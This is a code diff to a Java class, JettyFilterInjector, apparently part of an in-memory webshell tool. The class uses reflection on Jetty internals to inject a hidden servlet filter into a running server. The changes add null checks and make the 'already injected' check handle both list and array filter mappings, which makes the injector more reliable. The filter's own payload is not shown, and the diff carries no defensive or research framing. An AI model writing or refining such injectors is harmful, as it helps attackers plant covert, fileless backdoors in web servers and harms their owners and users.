@@ -48,6 +48,10 @@ public class JettyFilterInjector {
         Class<?> filterClass = magicFilter.getClass();
         Object servletHandler = getFieldValue(context, "_servletHandler");
 
+        if (servletHandler == null) {
+            return;
+        }
+
         // 1. 判断是否已经注入
         if (isInjected(servletHandler)) {
             System.out.println("filter is already injected");
@@ -197,17 +201,21 @@ public class JettyFilterInjector {
     }
 
     public boolean isInjected(Object servletHandler) throws Exception {
-        try {
-            Object filterMaps = getFieldValue(servletHandler, "_filterMappings");
-            for (int i = 0; i < Array.getLength(filterMaps); i++) {
-                Object filter = Array.get(filterMaps, i);
-                String filterName = (String) getFieldValue(filter, "_filterName");
-                if (filterName.equals(getClassName())) {
-                    return true;
-                }
-            }
-        } catch (Exception e) {
+        Object filterMappings = getFieldValue(servletHandler, "_filterMappings");
+        if (filterMappings == null) {
             return false;
+        }
+        Object[] filterMaps = new Object[0];
+        if (filterMappings instanceof List) {
+            filterMaps = ((List<?>) filterMappings).toArray();
+        } else if (filterMappings instanceof Object[]) {
+            filterMaps = (Object[]) filterMappings;
+        }
+        for (Object filterMap : filterMaps) {
+            Object filterName = getFieldValue(filterMap, "_filterName");
+            if (filterName.equals(getClassName())) {
+                return true;
+            }
         }
         return false;
     }
